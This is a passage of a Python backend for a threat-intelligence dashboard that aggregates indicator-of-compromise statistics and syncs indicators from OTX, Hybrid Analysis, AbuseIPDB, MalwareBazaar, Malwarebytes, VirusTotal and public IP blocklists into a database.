    """Aggregated intel: totals by type/severity, top adversaries, top malware
    families, top sources, and last OTX sync — powers the CrowdStrike-style
    Threat Intel Overview band on the frontend."""
    total = await db.iocs.count_documents({})
    by_type = {}
    for t in ("ip", "domain", "url", "md5", "sha1", "sha256"):
        by_type[t] = await db.iocs.count_documents({"type": t})
    by_type["hash"] = by_type.pop("md5", 0) + by_type.pop("sha1", 0) + by_type.pop("sha256", 0)
    by_severity = {s: await db.iocs.count_documents({"severity": s}) for s in IOC_SEVERITIES}
    otx = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})

    # Top adversary/family tags — tags stored as "actor:X" or "family:X".
    pipeline_tag = [
        {"$unwind": "$tags"},
        {"$group": {"_id": "$tags", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 60},
    ]
    tag_docs = await db.iocs.aggregate(pipeline_tag).to_list(60)
    adversaries, families, top_tags = [], [], []
    for d in tag_docs:
        tag = (d.get("_id") or "").strip()
        if not tag:
            continue
        entry = {"name": tag.split(":", 1)[1] if ":" in tag else tag, "count": d.get("count", 0)}
        if tag.lower().startswith("actor:"):
            adversaries.append(entry)
        elif tag.lower().startswith("family:"):
            families.append(entry)
        else:
            top_tags.append(entry)

    # Top threat_name (malware campaign / pulse title) — separate from family tags.
    pipeline_threat = [
        {"$match": {"threat_name": {"$ne": None, "$exists": True}}},
        {"$group": {"_id": "$threat_name", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 10},
    ]
    tn_docs = await db.iocs.aggregate(pipeline_threat).to_list(10)
    top_campaigns = [{"name": d["_id"], "count": d["count"]} for d in tn_docs if d.get("_id")]

    # Top sources (short label — strip pulse suffix)
    pipeline_src = [
        {"$match": {"source": {"$ne": None, "$exists": True}}},
        {"$project": {"source": {"$arrayElemAt": [{"$split": ["$source", " · "]}, 0]}}},
        {"$group": {"_id": "$source", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 8},
    ]
    src_docs = await db.iocs.aggregate(pipeline_src).to_list(8)
    top_sources = [{"name": d["_id"], "count": d["count"]} for d in src_docs if d.get("_id")]

    # Recent additions
    recent = await db.iocs.find({}, {"_id": 0, "value": 1, "type": 1, "severity": 1, "threat_name": 1, "source": 1, "created_at": 1}).sort("created_at", -1).limit(8).to_list(8)

    return {
        "total_iocs": total,
        "by_type": by_type,
        "by_severity": by_severity,
        "adversaries": adversaries[:10],
        "malware_families": families[:10],
        "top_campaigns": top_campaigns,
        "top_sources": top_sources,
        "top_tags": top_tags[:12],
        "recent": recent,
        "last_otx_sync": otx,
        "providers": {
            "virustotal": bool(VT_API_KEY),
            "abuseipdb": bool(ABUSEIPDB_API_KEY),
            "urlscan": bool(URLSCAN_API_KEY),
            "otx": bool(OTX_API_KEY),
            "hybrid_analysis": bool(HYBRID_ANALYSIS_API_KEY),
            "malwarebazaar": bool(MALWAREBAZAAR_API_KEY),
            "ai_summary": bool(EMERGENT_LLM_KEY),
        },
    }


# ---------------------------------------------------------------------------
# AlienVault OTX threat intelligence sync (auto on startup + daily)
# ---------------------------------------------------------------------------
OTX_API_KEY = os.environ.get("OTX_API_KEY")
OTX_BASE = "https://otx.alienvault.com/api/v1"
OTX_MAX_PULSES = 50
OTX_MAX_INDICATORS = 500
OTX_SYNC_INTERVAL_SEC = 24 * 60 * 60  # daily

# OTX indicator type -> normalized value / (skip if returns None)
def _otx_indicator_value(otx_type: str, indicator: str) -> Optional[str]:
    t = (otx_type or "").strip()
    v = (indicator or "").strip()
    if not v:
        return None
    if t in ("IPv4", "IPv6"):
        return v if _classify_ioc(v) == "ip" else None
    if t in ("domain", "hostname"):
        return v if _classify_ioc(v) == "domain" else None
    if t in ("URL", "URI"):
        return v if _classify_ioc(v) == "url" else None
    if t == "FileHash-MD5":
        return v if _classify_ioc(v) == "md5" else None
    if t == "FileHash-SHA1":
        return v if _classify_ioc(v) == "sha1" else None
    if t == "FileHash-SHA256":
        return v if _classify_ioc(v) == "sha256" else None
    return None


def _otx_severity(pulse: dict) -> str:
    """OTX pulses are curated threat intel — default to 'medium'. Escalate if
    the pulse carries strong indicators (malware families, adversary attribution
    or explicit high-confidence tags)."""
    tags_lower = {str(t).lower() for t in (pulse.get("tags") or [])}
    has_malware = bool(pulse.get("malware_families"))
    has_actor = bool((pulse.get("adversary") or "").strip())
    if any(k in tags_lower for k in ("ransomware", "apt", "zero-day", "0day", "wiper")):
        return "critical"
    if has_malware and has_actor:
        return "high"
    if has_malware or has_actor:
        return "high"
    return "medium"


async def _sync_otx_pulses(max_pulses: int = OTX_MAX_PULSES, max_indicators: int = OTX_MAX_INDICATORS) -> dict:
    """Fetch subscribed OTX pulses and upsert their indicators into db.iocs.

    Returns a summary dict: {pulses, indicators, added, updated, skipped, error?}.
    """
    if not OTX_API_KEY:
        return {"error": "OTX_API_KEY not configured", "pulses": 0, "indicators": 0, "added": 0, "updated": 0, "skipped": 0}

    headers = {"X-OTX-API-KEY": OTX_API_KEY, "User-Agent": "NivX-Machines/1.0"}
    pulses: List[dict] = []
    added = updated = skipped = ind_count = 0
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True) as hc:
            # Page through subscribed pulses until we hit max_pulses.
            page = 1
            while len(pulses) < max_pulses and page <= 5:
                r = await hc.get(f"{OTX_BASE}/pulses/subscribed", params={"limit": 50, "page": page}, headers=headers)
                if r.status_code != 200:
                    return {"error": f"OTX fetch failed ({r.status_code})", "pulses": 0, "indicators": 0, "added": 0, "updated": 0, "skipped": 0}
                data = r.json() or {}
                results = data.get("results") or []
                if not results:
                    break
                pulses.extend(results)
                if not data.get("next"):
                    break
                page += 1
            pulses = pulses[:max_pulses]

            for pulse in pulses:
                if ind_count >= max_indicators:
                    break
                threat_name = (pulse.get("name") or "").strip() or None
                severity = _otx_severity(pulse)
                tags = [str(t).strip() for t in (pulse.get("tags") or []) if str(t).strip()][:20]
                # Include adversary + malware family as tags when present.
                if pulse.get("adversary"):
                    tags.append(f"actor:{pulse['adversary']}")
                for fam in (pulse.get("malware_families") or [])[:5]:
                    fname = fam.get("display_name") if isinstance(fam, dict) else str(fam)
                    if fname:
                        tags.append(f"family:{fname}")
                # De-dup tags (case-insensitive)
                _seen = set()
                _dedup = []
                for t in tags:
                    tl = t.lower()
                    if tl not in _seen:
                        _seen.add(tl)
                        _dedup.append(t)
                tags = _dedup
                pulse_ref = pulse.get("id")
                source = f"AlienVault OTX · {pulse_ref}" if pulse_ref else "AlienVault OTX"
                for ind in pulse.get("indicators") or []:
                    if ind_count >= max_indicators:
                        break
                    ind_count += 1
                    value = _otx_indicator_value(ind.get("type"), ind.get("indicator"))
                    if not value:
                        skipped += 1
                        continue
                    notes = None
                    if pulse.get("description"):
                        notes = (pulse["description"] or "").strip()[:400] or None
                    try:
                        _, created = await _upsert_ioc(value, threat_name, tags, source, severity, notes)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception as e:
                        logger.warning(f"OTX upsert failed for {value}: {e}")
                        skipped += 1
    except Exception as e:
        logger.error(f"OTX sync error: {e}")
        return {"error": f"OTX sync error: {e}", "pulses": len(pulses), "indicators": ind_count, "added": added, "updated": updated, "skipped": skipped}

    summary = {
        "pulses": len(pulses),
        "indicators": ind_count,
        "added": added,
        "updated": updated,
        "skipped": skipped,
        "synced_at": now_iso(),
    }
    try:
        await db.otx_meta.update_one({"_id": "last_sync"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"OTX sync complete: {summary}")
    return summary


@api_router.get("/otx/status")
async def otx_status():
    meta = await db.otx_meta.find_one({"_id": "last_sync"}, {"_id": 0})
    return {"configured": bool(OTX_API_KEY), "last_sync": meta}


@api_router.post("/otx/sync")
async def otx_sync(user: dict = Depends(get_current_user)):
    if not OTX_API_KEY:
        raise HTTPException(status_code=503, detail="AlienVault OTX is not configured")
    summary = await _sync_otx_pulses()
    if summary.get("error"):
        raise HTTPException(status_code=502, detail=summary["error"])
    return summary


async def _otx_sync_loop():
    """Runs on startup + every OTX_SYNC_INTERVAL_SEC seconds."""
    # First delay a bit so the app finishes booting.
    await asyncio.sleep(15)
    while True:
        try:
            await _sync_otx_pulses()
        except Exception as e:
            logger.error(f"OTX loop error: {e}")
        await asyncio.sleep(OTX_SYNC_INTERVAL_SEC)


BULK_IOC_SYNC_INTERVAL_SEC = 2 * 60 * 60  # 2 hours — refreshes the whole IOC DB on a rolling window


async def _bulk_ioc_sync_loop():
    """Refreshes every bulk-IOC source (Hybrid Analysis, AbuseIPDB, MalwareBazaar,
    Malwarebytes, VT Enterprise if a key is present, and the Talos community
    blocklists) on a fixed cadence so the curated IOC DB and dashboard numbers
    stay fresh without any manual click."""
    await asyncio.sleep(45)  # let OTX go first + app fully warm
    while True:
        try:
            tasks = [
                _sync_hybrid_analysis_feed() if HYBRID_ANALYSIS_API_KEY else None,
                _sync_abuseipdb_blacklist()   if ABUSEIPDB_API_KEY       else None,
                _sync_malwarebazaar_recent()  if MALWAREBAZAAR_API_KEY   else None,
                _sync_malwarebytes_iocs(),
                _sync_virustotal_intel()      if VT_API_KEY              else None,
                _sync_talos_blocklist(),
                _sync_urlhaus_feed(),
                _sync_threatfox_feed() if ABUSECH_AUTH_KEY else None,
                _sync_cins_army(),
            ]
            active = [t for t in tasks if t is not None]
            await asyncio.gather(*active, return_exceptions=True)
            logger.info("Bulk-IOC scheduled sync loop iteration complete")
        except Exception as e:
            logger.error(f"Bulk-IOC loop error: {e}")
        await asyncio.sleep(BULK_IOC_SYNC_INTERVAL_SEC)


# ---------------------------------------------------------------------------
# Hybrid Analysis "latest feed" sync — pulls last 250 sandbox submissions
# and upserts their SHA256 hashes into the curated IOC database.
# ---------------------------------------------------------------------------
HA_FEED_URL = "https://www.hybrid-analysis.com/api/v2/feed/latest"
HA_FEED_MAX = 250


def _ha_severity(item: dict) -> str:
    verdict = str(item.get("verdict") or "").lower()
    threat_level = int(item.get("threat_level") or 0)
    threat_score = int(item.get("threat_score") or 0)
    if verdict == "malicious" or threat_level >= 2 or threat_score >= 80:
        return "critical"
    if verdict == "suspicious" or threat_level == 1 or threat_score >= 50:
        return "high"
    if threat_score >= 20:
        return "medium"
    return "low"


async def _sync_hybrid_analysis_feed(max_items: int = HA_FEED_MAX) -> dict:
    if not HYBRID_ANALYSIS_API_KEY:
        return {"error": "HYBRID_ANALYSIS_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = 0
    items: List[dict] = []
    try:
        async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
            r = await hc.get(HA_FEED_URL, headers={"api-key": HYBRID_ANALYSIS_API_KEY, "User-Agent": "Falcon Sandbox", "Accept": "application/json"})
            if r.status_code != 200:
                return {"error": f"Hybrid Analysis feed failed ({r.status_code})", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            payload = r.json() or {}
            data = payload.get("data") if isinstance(payload, dict) else payload
            items = (data or [])[:max_items] if isinstance(data, list) else []
            for it in items:
                # Prefer sha256, then sha1, then md5.
                value = (it.get("sha256") or it.get("sha1") or it.get("md5") or "").strip()
                if not value or _classify_ioc(value) not in ("sha256", "sha1", "md5"):
                    skipped += 1
                    continue
                family = (it.get("vx_family") or "").strip() or None
                verdict = (it.get("verdict") or "").strip() or None
                threat_name = family or verdict or "Hybrid Analysis submission"
                tags: List[str] = []
                if family:
                    tags.append(f"family:{family}")
                if verdict:
                    tags.append(f"verdict:{verdict}")
                for t in (it.get("tags") or [])[:8]:
                    ts = str(t).strip()
                    if ts:
                        tags.append(ts)
                sub_type = (it.get("submit_name") or it.get("type") or "").strip()
                notes_bits = []
                if it.get("threat_score") is not None:
                    notes_bits.append(f"threat_score={it.get('threat_score')}")
                if it.get("threat_level") is not None:
                    notes_bits.append(f"threat_level={it.get('threat_level')}")
                if sub_type:
                    notes_bits.append(f"submit={sub_type[:80]}")
                notes = "; ".join(notes_bits) or None
                job_id = it.get("job_id") or it.get("sha256") or ""
                source = f"Hybrid Analysis · {job_id}" if job_id else "Hybrid Analysis"
                try:
                    _, created = await _upsert_ioc(value, threat_name, tags, source, _ha_severity(it), notes)
                    added += 1 if created else 0
                    updated += 0 if created else 1
                except Exception as e:
                    logger.warning(f"Hybrid Analysis upsert failed for {value}: {e}")
                    skipped += 1
    except Exception as e:
        logger.error(f"Hybrid Analysis sync error: {e}")
        return {"error": f"Hybrid Analysis sync error: {e}", "items": len(items), "added": added, "updated": updated, "skipped": skipped}

    summary = {"items": len(items), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "hybrid_analysis"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"Hybrid Analysis sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# AbuseIPDB blacklist sync — pulls top abused IPs and upserts them.
# NOTE: /api/v2/blacklist is a subscriber/paid tier feature on AbuseIPDB.
# On a free key you'll get HTTP 402/403 and this sync returns a friendly error.
# ---------------------------------------------------------------------------
ABUSEIPDB_BLACKLIST_URL = "https://api.abuseipdb.com/api/v2/blacklist"
ABUSEIPDB_BLACKLIST_MAX = 1000
ABUSEIPDB_CONFIDENCE_MIN = 90


async def _sync_abuseipdb_blacklist(limit: int = ABUSEIPDB_BLACKLIST_MAX, confidence_min: int = ABUSEIPDB_CONFIDENCE_MIN) -> dict:
    if not ABUSEIPDB_API_KEY:
        return {"error": "ABUSEIPDB_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = 0
    items: List[dict] = []
    try:
        async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
            r = await hc.get(
                ABUSEIPDB_BLACKLIST_URL,
                params={"confidenceMinimum": confidence_min, "limit": limit},
                headers={"Key": ABUSEIPDB_API_KEY, "Accept": "application/json"},
            )
            if r.status_code == 402 or r.status_code == 403:
                return {"error": "AbuseIPDB blacklist requires a paid subscription (Basic/Premium tier)", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            if r.status_code != 200:
                return {"error": f"AbuseIPDB blacklist failed ({r.status_code})", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            payload = r.json() or {}
            items = payload.get("data") or []
            for it in items:
                ip = (it.get("ipAddress") or "").strip()
                if not ip or _classify_ioc(ip) != "ip":
                    skipped += 1
                    continue
                score = int(it.get("abuseConfidenceScore") or 0)
                cc = (it.get("countryCode") or "").strip()
                sev = "critical" if score >= 95 else "high" if score >= 90 else "medium"
                tags = ["abuseipdb"]
                if cc:
                    tags.append(f"country:{cc}")
                tags.append(f"confidence:{score}")
                threat_name = f"AbuseIPDB confidence {score}"
                notes = f"Last reported {it.get('lastReportedAt') or 'unknown'}"
                try:
                    _, created = await _upsert_ioc(ip, threat_name, tags, "AbuseIPDB Blacklist", sev, notes)
                    added += 1 if created else 0
                    updated += 0 if created else 1
                except Exception as e:
                    logger.warning(f"AbuseIPDB upsert failed for {ip}: {e}")
                    skipped += 1
    except Exception as e:
        logger.error(f"AbuseIPDB sync error: {e}")
        return {"error": f"AbuseIPDB sync error: {e}", "items": len(items), "added": added, "updated": updated, "skipped": skipped}

    summary = {"items": len(items), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "abuseipdb"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"AbuseIPDB sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# MalwareBazaar bulk sync — pulls the last ~100 sample submissions from
# abuse.ch and upserts their SHA256 hashes into the curated IOC database.
# ---------------------------------------------------------------------------
async def _sync_malwarebazaar_recent(selector: int = 100) -> dict:
    if not MALWAREBAZAAR_API_KEY:
        return {"error": "MALWAREBAZAAR_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = 0
    async with httpx.AsyncClient(timeout=30, follow_redirects=True) as hc:
        feed = await _mb_get_recent(hc, selector=selector)
    if feed.get("error"):
        return {"error": feed["error"], "items": 0, "added": 0, "updated": 0, "skipped": 0}
    samples = feed.get("samples") or []
    for s in samples:
        value = (s.get("sha256_hash") or "").strip()
        if not value or _classify_ioc(value) != "sha256":
            skipped += 1
            continue
        family = (s.get("signature") or "").strip() or None
        file_type = (s.get("file_type") or "").strip() or None
        threat_name = family or file_type or "MalwareBazaar submission"
        tags: List[str] = ["malwarebazaar"]
        if family:
            tags.append(f"family:{family}")
        for t in (s.get("tags") or [])[:8]:
            ts = str(t).strip()
            if ts:
                tags.append(ts)
        source = f"MalwareBazaar · {s.get('sha256_hash')[:12]}"
        notes_bits = []
        if s.get("file_name"):
            notes_bits.append(f"file={s.get('file_name')[:80]}")
        if file_type:
            notes_bits.append(f"type={file_type}")
        if s.get("file_size"):
            notes_bits.append(f"size={s.get('file_size')}")
        if s.get("first_seen"):
            notes_bits.append(f"first_seen={s.get('first_seen')}")
        notes = "; ".join(notes_bits) or None
        # Severity: signed / known malware family = critical, otherwise high (all MB submissions are malware).
        sev = "critical" if family else "high"
        try:
            _, created = await _upsert_ioc(value, threat_name, tags, source, sev, notes)
            added += 1 if created else 0
            updated += 0 if created else 1
        except Exception as e:
            logger.warning(f"MalwareBazaar upsert failed for {value}: {e}")
            skipped += 1
    summary = {"items": len(samples), "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "malwarebazaar"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"MalwareBazaar sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Malwarebytes threat-intel blog IOC scraper — pulls the last N articles from
# https://www.malwarebytes.com/search/iocs and extracts the "IOCs" section
# (hashes, defanged domains, defanged IPs) into the curated IOC database.
# No API key required (public content).
# ---------------------------------------------------------------------------
MWB_SEARCH_URL = "https://www.malwarebytes.com/blog/feed/"
MWB_MAX_ARTICLES = 12        # per sync run — enough to be fresh without hammering
MWB_MAX_IOCS_PER_TYPE = 50   # per-article cap to defend against poorly-structured pages


def _refang(v: str) -> str:
    """Refang defanged IOCs: `foo[.]bar` -> `foo.bar`, `hxxp[s]://` -> `http[s]://`."""
    if not v:
        return v
    v = v.replace("[.]", ".").replace("(.)", ".").replace("{.}", ".")
    v = v.replace("[:]", ":").replace("hxxps://", "https://").replace("hxxp://", "http://")
    return v.strip().strip(",;'\"`")


_HASH_RE = re.compile(r"\b([a-fA-F0-9]{64}|[a-fA-F0-9]{40}|[a-fA-F0-9]{32})\b")
_IP_RE   = re.compile(r"\b(\d{1,3}(?:[\.\[\]]+\d{1,3}){3})\b")
_DOMAIN_RE = re.compile(r"\b([a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(?:[\[\.\]]+[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?){1,4})\b")


def _extract_iocs_from_article(md: str) -> dict:
    """Return {hashes: [str], ips: [str], domains: [str]} from an article body.
    Restricts extraction to the '## IOCs' / 'Indicators of Compromise' section to
    reduce false positives (author bios, external references, changelog dates, etc.)."""
    if not md:
        return {"hashes": [], "ips": [], "domains": []}
    # Find the IOC section.
    m = re.search(r"(?is)#+\s*(iocs?|indicators of compromise)\s*\n(.*?)(\n#+\s|\Z)", md)
    body = m.group(2) if m else md  # fall back to full body if no explicit section
    hashes = list({h.lower() for h in _HASH_RE.findall(body)})[:MWB_MAX_IOCS_PER_TYPE]
    ips: list[str] = []
    for raw in _IP_RE.findall(body)[:MWB_MAX_IOCS_PER_TYPE * 3]:
        ip = _refang(raw)
        if _classify_ioc(ip) == "ip" and ip not in ips:
            ips.append(ip)
            if len(ips) >= MWB_MAX_IOCS_PER_TYPE:
                break
    domains: list[str] = []
    for raw in _DOMAIN_RE.findall(body)[:MWB_MAX_IOCS_PER_TYPE * 4]:
        # Only accept if it was defanged in-source (avoids matching URLs of the article itself, etc.).
        if "[.]" not in raw and "[.]" not in body[max(0, body.find(raw) - 5):body.find(raw) + len(raw) + 5]:
            continue
        d = _refang(raw).lower().strip(".")
        if _classify_ioc(d) == "domain" and d not in domains and d not in ("malwarebytes.com", "wp-content.com"):
            domains.append(d)
            if len(domains) >= MWB_MAX_IOCS_PER_TYPE:
                break
    return {"hashes": hashes, "ips": ips, "domains": domains}


async def _sync_malwarebytes_iocs(max_articles: int = MWB_MAX_ARTICLES) -> dict:
    added = updated = skipped = 0
    articles_processed = 0
    async with httpx.AsyncClient(timeout=25, follow_redirects=True, headers={"User-Agent": "NivX-ThreatIntel/1.0"}) as hc:
        try:
            r = await hc.get(MWB_SEARCH_URL)
            if r.status_code != 200:
                return {"error": f"Malwarebytes search HTTP {r.status_code}", "items": 0, "added": 0, "updated": 0, "skipped": 0}
            # Extract article links from the RSS feed.
            links = re.findall(r"<link>([^<]+)</link>", r.text)
            seen = set()
            article_urls: list[str] = []
            for u in links:
                if u in seen:
                    continue
                seen.add(u)
                # Only accept full-slug article URLs (skip category / feed / home).
                if re.search(r"/blog/[a-z\-]+/\d{4}/\d{2}/[a-z0-9\-]+", u):
                    article_urls.append(u)
                if len(article_urls) >= max_articles:
                    break
        except Exception as e:
            return {"error": f"Malwarebytes listing error: {e}", "items": 0, "added": 0, "updated": 0, "skipped": 0}

        for url in article_urls:
            try:
                ar = await hc.get(url)
                if ar.status_code != 200:
                    continue
                articles_processed += 1
                title_m = re.search(r"<title>([^<]+)</title>", ar.text)
                title = (title_m.group(1) if title_m else "Malwarebytes article").split("|")[0].strip()
                iocs = _extract_iocs_from_article(ar.text)
                slug = url.rstrip("/").split("/")[-1][:60]
                src = f"Malwarebytes · {slug}"
                notes = title[:180]
                for h in iocs["hashes"]:
                    try:
                        _, created = await _upsert_ioc(h, title[:80], ["malwarebytes"], src, "high", notes)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
                for ip in iocs["ips"]:
                    try:
                        _, created = await _upsert_ioc(ip, title[:80], ["malwarebytes", "c2"], src, "high", notes)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
                for d in iocs["domains"]:
                    try:
                        _, created = await _upsert_ioc(d, title[:80], ["malwarebytes", "c2"], src, "high", notes)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
            except Exception as e:
                logger.warning(f"Malwarebytes article fetch failed for {url}: {e}")
                continue

    summary = {"items": articles_processed, "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "malwarebytes"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"Malwarebytes sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# VirusTotal Enterprise sync — pulls Livehunt-matched files (YARA hits) and
# the unified IOC Stream (files/urls/domains/ips) into the curated IOC DB.
# Requires an ENTERPRISE key; free-tier keys will 401 and we log-and-skip
# so nothing else breaks.
# ---------------------------------------------------------------------------
VT_INTEL_LIVEHUNT_URL   = "https://www.virustotal.com/api/v3/intelligence/hunting_notification_files"
VT_INTEL_IOC_STREAM_URL = "https://www.virustotal.com/api/v3/intelligence/ioc_stream_notifications"
VT_INTEL_MAX_ITEMS = 200


def _vt_severity(stats: dict) -> str:
    mal = int((stats or {}).get("malicious") or 0)
    susp = int((stats or {}).get("suspicious") or 0)
    if mal >= 20:
        return "critical"
    if mal >= 5:
        return "high"
    if mal >= 1 or susp >= 3:
        return "medium"
    return "low"


async def _sync_virustotal_intel(max_items: int = VT_INTEL_MAX_ITEMS) -> dict:
    """VT Enterprise: pull Livehunt file matches + IOC Stream notifications and
    upsert them into the `iocs` collection. Non-enterprise keys yield a friendly
    'not_enterprise' skip, not an error."""
    if not VT_API_KEY:
        return {"error": "VIRUSTOTAL_API_KEY not configured", "items": 0, "added": 0, "updated": 0, "skipped": 0}
    added = updated = skipped = items_seen = 0
    headers = {"x-apikey": VT_API_KEY, "accept": "application/json"}
    async with httpx.AsyncClient(timeout=25, follow_redirects=True) as hc:
        # 1) Livehunt file matches
        try:
            r = await hc.get(VT_INTEL_LIVEHUNT_URL, headers=headers, params={"limit": min(40, max_items)})
            if r.status_code in (401, 403):
                return {"skipped": True, "reason": "VT Enterprise tier required (free-tier key detected)", "items": 0, "added": 0, "updated": 0}
            if r.status_code == 200:
                payload = r.json() or {}
                for it in (payload.get("data") or [])[:max_items]:
                    items_seen += 1
                    attrs = it.get("attributes") or {}
                    ctx = it.get("context_attributes") or {}
                    sha256 = attrs.get("sha256") or it.get("id")
                    if not sha256:
                        skipped += 1
                        continue
                    stats = attrs.get("last_analysis_stats") or {}
                    name = attrs.get("meaningful_name") or (ctx.get("rule_name") and f"Livehunt: {ctx['rule_name']}") or "VT Livehunt match"
                    tags = ["virustotal", "livehunt"]
                    if ctx.get("rule_name"):
                        tags.append(f"rule:{ctx['rule_name']}")
                    for t in (ctx.get("tags") or [])[:6]:
                        if t:
                            tags.append(str(t))
                    notes = f"vt_stats={stats.get('malicious',0)}m/{stats.get('suspicious',0)}s · {attrs.get('type_description') or ''}".strip(" ·")
                    try:
                        _, created = await _upsert_ioc(sha256, name[:80], tags, f"VirusTotal Livehunt · {sha256[:8]}", _vt_severity(stats), notes[:180])
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
        except Exception as e:
            logger.warning(f"VT Livehunt fetch failed: {e}")

        # 2) IOC Stream — unified files/urls/domains/ips notifications
        try:
            r = await hc.get(VT_INTEL_IOC_STREAM_URL, headers=headers, params={"limit": min(40, max_items)})
            if r.status_code == 200:
                payload = r.json() or {}
                for it in (payload.get("data") or [])[:max_items]:
                    items_seen += 1
                    ent = (it.get("context_attributes") or {}).get("notification_source_key") or ""
                    ent_type = it.get("type", "")
                    # IOC Stream returns nested "attributes" per object type.
                    attrs = it.get("attributes") or {}
                    value = None
                    if ent_type in ("file", "hunting_notification"):
                        value = attrs.get("sha256") or it.get("id")
                    elif ent_type in ("domain", "domain_notification"):
                        value = attrs.get("id") or it.get("id")
                    elif ent_type in ("url", "url_notification"):
                        value = attrs.get("url") or attrs.get("id")
                    elif ent_type in ("ip_address", "ip_notification"):
                        value = attrs.get("id") or it.get("id")
                    else:
                        value = it.get("id")
                    if not value or _classify_ioc(str(value)) == "unknown":
                        skipped += 1
                        continue
                    stats = attrs.get("last_analysis_stats") or {}
                    tags = ["virustotal", "ioc-stream"]
                    if ent:
                        tags.append(f"stream:{ent}")
                    try:
                        _, created = await _upsert_ioc(str(value), "VT IOC Stream match", tags, "VirusTotal IOC Stream", _vt_severity(stats), None)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
        except Exception as e:
            logger.warning(f"VT IOC Stream fetch failed: {e}")

    summary = {"items": items_seen, "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "virustotal"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"VirusTotal Enterprise sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Community-blocklist sync — Cisco Talos gates bulk downloads behind login/CF,
# so we source from the industry-standard public feeds that also power Talos'
# community lists: Emerging Threats compromised-IPs + Abuse.ch Feodo Tracker.
# Both refresh hourly, no key required.
# ---------------------------------------------------------------------------
TALOS_COMMUNITY_FEEDS = [
    ("Emerging Threats compromised-ips", "https://rules.emergingthreats.net/blockrules/compromised-ips.txt", ["talos", "et-community", "blocklist"]),
    ("Feodo Tracker (abuse.ch)",         "https://feodotracker.abuse.ch/downloads/ipblocklist_recommended.txt", ["talos", "feodo-tracker", "botnet-c2"]),
]


async def _sync_talos_blocklist() -> dict:
    added = updated = skipped = total_ips = 0
    async with httpx.AsyncClient(timeout=20, follow_redirects=True, headers={"User-Agent": "NivX-ThreatIntel/1.0"}) as hc:
        for label, url, tags in TALOS_COMMUNITY_FEEDS:
            try:
                r = await hc.get(url)
                if r.status_code != 200:
                    logger.warning(f"{label} HTTP {r.status_code}")
                    continue
                for line in r.text.splitlines():
                    s = line.strip()
                    if not s or s.startswith("#"):
                        continue
                    if _classify_ioc(s) != "ip":
                        continue
                    total_ips += 1
                    if total_ips > 4000:  # global cap across all feeds
                        break
                    try:
                        _, created = await _upsert_ioc(s, f"{label} entry", tags, label, "high", "Community IP blocklist", ttl_days=60)
                        added += 1 if created else 0
                        updated += 0 if created else 1
                    except Exception:
                        skipped += 1
            except Exception as e:
                logger.warning(f"{label} fetch error: {e}")
                continue
    summary = {"items": total_ips, "added": added, "updated": updated, "skipped": skipped, "synced_at": now_iso()}
    try:
        await db.sync_meta.update_one({"_id": "talos"}, {"$set": summary}, upsert=True)
    except Exception:
        pass
    logger.info(f"Talos-community blocklist sync complete: {summary}")
    return summary


# ---------------------------------------------------------------------------
# Abuse.ch URLhaus + ThreatFox + CINS Army feed collectors
# All free, no API key required. Added Feb 2026 to complete the P1 Threat
# Intelligence Feed Collector: URLhaus (malicious URLs), ThreatFox (mixed IOCs
# with malware family attribution), and CINS Army (Sentinel IPS bad-actor IPs).
# ---------------------------------------------------------------------------
URLHAUS_RECENT_JSON = "https://urlhaus.abuse.ch/downloads/json_recent/"
THREATFOX_RECENT_JSON = "https://threatfox-api.abuse.ch/api/v1/"
CINS_ARMY_LIST = "http://cinsscore.com/list/ci-badguys.txt"
ABUSECH_AUTH_KEY = os.environ.get("ABUSECH_AUTH_KEY", "").strip()


def _abusech_headers() -> dict:
    h = {"User-Agent": "NivX-ThreatIntel/1.0"}
    if ABUSECH_AUTH_KEY:
        h["Auth-Key"] = ABUSECH_AUTH_KEY
    return h


async def _sync_urlhaus_feed(max_items: int = 2500) -> dict:
